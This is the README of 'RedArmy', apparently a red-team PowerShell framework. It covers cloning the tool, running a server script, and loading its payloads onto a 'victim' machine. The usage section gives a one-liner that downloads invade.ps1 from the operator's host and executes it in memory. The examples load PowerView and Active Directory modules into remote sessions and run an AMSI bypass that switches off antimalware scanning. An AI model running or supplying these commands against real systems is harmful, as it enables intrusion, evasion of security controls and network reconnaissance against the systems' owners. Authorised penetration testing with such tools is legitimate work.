# RedArmy

## Installation

```
$ git clone https://gitlab.com/mjwhitta/redarmy.git
$ cd ./redarmy
$ git submodule update --init --recursive
$ git submodule foreach git checkout master # optional
$ git submodule foreach git pull # optional
```

## Configuration

RedArmy uses `config.default` by default. You can copy it to `config`
and delete or add lines as necessary.

Any filepaths starting with `./` will create `Invoke` functions rather
than `Get` functions. `Invoke` commands are generally for things that
aren't scope specific such as modifying system settings. See [the
default config](./config.default) for examples.

## Usage

```
$ ./serve [--port PORT] [--update] <ip>
```

Once the `serve` script is running, you can use the following to load
RedArmy on the victim:

- `iex (iwr -DisableKeepAlive -UseBasicParsing
  http://<ip>:<port>/invade.ps1)`

That command will also displayed for you to copy and paste for
convenience.

### Examples

- Load ps1 script into current session
    - `iex (Get-PowerView)`
- Load ps1 script into specified session in background
    - `Deploy-PowerView <session>`
- Load DLL object into current session
    - `Import-ADModuleDLL`
- Load DLL object into specified session in background
    - `Deploy-ADModuleDLL <session>`
- Run ps1 script in current session
    - `Invoke-AMSIBypass`
- Run ps1 script in current session in background
    - `Invoke-AMSIBypassInBg`
- Run ps1 script in specified session in background
    - `Deploy-AMSIBypass <session>`
